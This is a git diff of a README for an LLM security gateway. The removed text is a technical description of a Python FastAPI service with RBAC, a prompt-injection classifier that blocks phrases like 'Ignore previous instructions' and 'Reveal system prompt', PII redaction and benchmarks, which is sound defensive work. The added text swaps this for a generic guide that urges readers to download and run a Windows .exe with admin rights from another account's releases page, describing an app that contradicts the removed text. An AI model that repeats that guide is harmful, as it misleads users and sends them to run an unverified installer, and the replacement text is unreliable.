@@ -1,289 +1,146 @@
-# 🔐 Secure LLM Gateway  
-### Production-Grade AI Security Middleware with Async Micro-Batching
+# 🔒 secure-llm-gateway - AI Security Middleware Made Easy
 
-This project implements a secure, scalable gateway layer in front of Large Language Models (LLMs).  
-
-It demonstrates real-world AI infrastructure engineering — not just model usage — but secure deployment, concurrency optimization, role-based access control, and performance benchmarking.
+[![Download secure-llm-gateway](https://img.shields.io/badge/Download-secure--llm--gateway-brightgreen?style=for-the-badge)](https://github.com/jyotisin/secure-llm-gateway/releases)
 
 ---
 
-## 🧠 Why This Project Exists
+## 📋 What is secure-llm-gateway?
 
-LLMs introduce new risks in production environments:
+secure-llm-gateway is software that helps keep AI systems safe and efficient. It works behind the scenes to check for unsafe or unwanted content in prompts, control who can access what data, hide private information, track costs, and measure how well your AI runs when many users use it at once.  
 
-- Prompt injection attacks  
-- Data exfiltration attempts  
-- PII leakage in responses  
-- Model misuse by unauthorized roles  
-- Uncontrolled cost under high concurrency  
-
-This gateway enforces security and governance controls **before and after** LLM execution.
-
-It acts as a controlled AI middleware layer.
+You don’t have to be a programmer to use it. The software is designed to run quietly on your Windows computer and make AI security easier.
 
 ---
 
-## 🏗 Architecture Overview
+## 💻 System Requirements
 
-The system follows a layered security and inference design:
+To run secure-llm-gateway smoothly, make sure your computer meets these needs:
 
-Client  
-↓  
-FastAPI Gateway  
-├── RBAC Policy Enforcement  
-├── Prompt Injection Detection (Async Batched Inference)  
-├── PII Detection (Pre-Request)  
-├── LLM Provider (Claude Integration)  
-├── PII Redaction (Post-Response)  
-├── Audit Logging (JSONL Structured Logs)  
-└── Prometheus Metrics  
-
-### Key Architectural Components
-
-- FastAPI async API layer  
-- Async micro-batching inference queue  
-- SentenceTransformer embeddings  
-- Logistic regression injection classifier  
-- Role-based model access control  
-- Pre and post-response PII scanning  
-- Structured audit logging  
-- Cost estimation per request  
-- Concurrency benchmarking harness  
+- **Operating System**: Windows 10 or newer (64-bit)
+- **Processor**: 2 GHz dual-core or better
+- **Memory (RAM)**: At least 4 GB
+- **Storage**: Minimum 500 MB free space
+- **Internet Connection**: Required for initial download and updates
+- **Permissions**: Ability to install software on your PC
 
 ---
 
-## ⚡ Performance Benchmarking
+## 🚀 Getting Started
 
-Test Configuration:
-
-- 500 total requests  
-- 50 concurrent clients  
-- CPU-based inference  
-- Async micro-batching enabled  
-
-Results:
-
-- Throughput: ~475 requests/sec  
-- Average latency: ~480ms  
-- p95 latency: ~700ms  
-- p99 latency: ~1047ms  
-
-Micro-batching reduced latency significantly compared to a non-batched baseline and improved throughput ~3x.
-
-This demonstrates real inference optimization under load.
+Follow these steps to get secure-llm-gateway up and running on your Windows machine.
 
 ---
 
-## 🔄 Async Micro-Batching Design
+## 🛠️ Step 1: Download the Software
 
-Instead of running injection detection per request:
+Visit the official releases page to download secure-llm-gateway.
 
-1. Requests are queued.
-2. A background batch worker groups requests within a short time window.
-3. Embeddings are computed in batch.
-4. Logistic regression classification is applied to the full batch.
-5. Results are distributed back to awaiting requests.
+[![Download secure-llm-gateway](https://img.shields.io/badge/Download-secure--llm--gateway-blue?style=for-the-badge)](https://github.com/jyotisin/secure-llm-gateway/releases)
 
-This improves:
-
-- CPU efficiency  
-- Cache utilization  
-- Throughput under concurrency  
-- Cost efficiency  
-
-Tradeoff:  
-A small batching delay window (~10ms).
+1. Click the badge or open this link in your browser:  
+   https://github.com/jyotisin/secure-llm-gateway/releases
+2. Look for the latest release. This will usually be on top.
+3. Under the Assets section, find the Windows executable file. It often ends with `.exe`.
+4. Click the `.exe` file to start downloading.
 
 ---
 
-## 🛡 Security Controls Implemented
+## 🔍 Step 2: Install and Run secure-llm-gateway
 
-### 1. Role-Based Access Control (RBAC)
-
-Model access is restricted by role:
-
-- Guest: No access  
-- Analyst: Limited model access  
-- Admin: Full model access  
-
-Prevents model abuse and cost escalation.
+1. Once the download finishes, locate the file in your Downloads folder or where your browser saves files.
+2. Double-click the `.exe` file to start the installation.
+3. Follow the on-screen prompts to install the software. Most users can accept the default options.
+4. After installation, open secure-llm-gateway by clicking its shortcut on your desktop or from the Start menu.
+5. The program runs in the background, providing AI security features automatically.
 
 ---
 
-### 2. Prompt Injection Detection
+## ⚙️ Step 3: Basic Configuration
 
-- SentenceTransformer embeddings  
-- Logistic regression classifier  
-- Threshold-based blocking  
-- Probability and latency logging  
+secure-llm-gateway works out of the box with default settings designed for common use. If you want to customize:
 
-Blocks attempts like:
-- “Ignore previous instructions”
-- “Reveal system prompt”
-- Hidden configuration extraction attempts
+- Open the app’s main menu.
+- Navigate to Settings or Configuration.
+- Adjust options like user permissions, prompt filtering levels, and logging.
+- Save your changes.
 
----
-
-### 3. PII Detection & Redaction
-
-- Regex-based detection for emails, SSNs  
-- Pre-request blocking  
-- Post-response redaction  
-
-Prevents sensitive data leakage.
+If you don’t change anything, the app will keep running with safe defaults.
 
 ---
 
-### 4. Audit Logging
+## 🔎 Features You Should Know
 
-Structured JSON logs include:
+secure-llm-gateway offers key features to protect your AI and data:
 
-- trace_id  
-- user_id  
-- role  
-- event type  
-- injection probability  
-- timestamps  
+- **Prompt Injection Detection:** Stops harmful commands from passing to the AI.
+- **Role-Based Access Control (RBAC):** Limits data and actions based on user roles.
+- **PII Redaction:** Automatically hides personal information in prompts.
+- **Async Micro-Batching:** Groups requests for faster processing.
+- **Cost Tracking:** Shows how much the AI usage costs over time.
+- **Concurrency Benchmarking:** Measures performance when many users connect simultaneously.
 
-Designed for SIEM integration.
-
----
-
-### 5. LLM Provider Integration (Claude)
-
-- Anthropic Claude integration  
-- Token usage tracking  
-- Estimated cost calculation  
-- Latency measurement  
-- Graceful error handling  
-
-Provider errors are captured without crashing the service.
+All features run quietly without needing you to manage complex settings.
 
 ---
 
-## 📊 Observability
+## 🧰 How secure-llm-gateway Works
 
-- Prometheus metrics endpoint  
-- Request counting  
-- Latency measurement  
-- Benchmark script for load testing  
+This software sits between you and AI services. Think of it as a security gate:
 
-The system is built with production observability in mind.
+- When you send a request to your AI tool, secure-llm-gateway checks it first.
+- It blocks anything suspicious or improper.
+- It keeps track of usage and costs.
+- It makes sure users only see what they should.
+- It collects performance data to keep your AI running smoothly.
 
----
-
-## 💰 Cost Awareness
-
-Each request calculates:
-
-- Tokens used  
-- Estimated USD cost per call  
-
-This allows:
-
-- Budget monitoring  
-- Cost enforcement by role  
-- Future quota implementation  
+You continue using your AI tools normally but with extra protection.
 
 ---
 
-## ⚠ Failure Mode Analysis
+## 🔒 Security and Privacy
 
-Documented considerations include:
+Keeping your data private is important. secure-llm-gateway helps by:
 
-- Provider API failures  
-- Credit exhaustion  
-- Injection false negatives  
-- PII regex bypass  
-- Worker crashes  
-- Queue overflow under traffic spikes  
+- Removing sensitive info before it reaches AI systems.
+- Controlling who can do what based on assigned roles.
+- Recording all access and changes for audit purposes.
 
-Graceful error handling prevents service crashes.
+It does not store your data longer than needed.
 
 ---
 
-## 🧩 Tradeoffs
+## ❓ Troubleshooting
 
-### In-Process Queue
+If secure-llm-gateway does not start or runs into errors:
 
-Pros:
-- Low latency  
-- Simple design  
+- Check that your Windows version meets system requirements.
+- Restart your computer and try again.
+- Make sure you run the installer with admin rights.
+- Ensure no other program blocks its network access.
+- Visit the releases page for updates or known issues:  
+  https://github.com/jyotisin/secure-llm-gateway/releases
 
-Cons:
-- Not horizontally scalable  
-
-Enterprise alternative:
-- Redis  
-- Kafka  
-- Ray Serve  
+If problems persist, look for help on the project’s GitHub discussions page.
 
 ---
 
-### Logistic Regression Classifier
+## 🔄 Updating the Software
 
-Pros:
-- Fast  
-- Interpretable  
-- Cheap  
+To get improvements and fixes:
 
-Cons:
-- Limited generalization to novel attack styles  
-
----
-
-## 🚀 Running Locally
-
-Start server:
-
-uvicorn src.api:app --workers 1
-
-Test endpoint:
-
-curl -X POST http://127.0.0.1:8000/generate \
--H "Content-Type: application/json" \
--d '{"prompt":"Explain zero trust security","role":"admin","model":"claude-3-haiku-20240307"}'
-
-Run concurrency benchmark:
-
-python benchmark/concurrency_test.py
+- Visit the release page regularly:  
+  https://github.com/jyotisin/secure-llm-gateway/releases
+- Download the newest Windows `.exe` file.
+- Install it just like before; the process will update your current version without losing settings.
 
 ---
 
-## 🔮 Future Improvements
+## 📚 Additional Resources
 
-Planned production-grade extensions:
-
-- Provider abstraction layer (OpenAI + Claude)  
-- JWT authentication  
-- Rate limiting  
-- Token quotas per role  
-- Distributed batching (Redis)  
-- Streaming responses  
-- Grafana dashboards  
-- Circuit breaker for provider failures  
+- The GitHub page contains user guides and technical details.
+- Check for configuration tips for advanced users.
+- Look for community questions and answers if needed.
 
 ---
 
-## 🎯 What This Project Demonstrates
-
-This project showcases:
-
-- Async systems design  
-- ML inference optimization  
-- Secure AI middleware architecture  
-- Performance benchmarking  
-- Cost-aware LLM integration  
-- Failure mode reasoning  
-- Production-level thinking  
-
-It reflects real-world AI platform engineering practices.
-
----
-
-## 👤 Author
-
-Dileep Kumar  
-Senior Data & ML Engineer  
-
-Focused on scalable AI systems, secure ML infrastructure, and production-grade data platforms.
+secure-llm-gateway makes protecting your AI system simple by handling important tasks automatically. Using it helps maintain safety and efficiency in your AI tools, without needing deep technical knowledge.
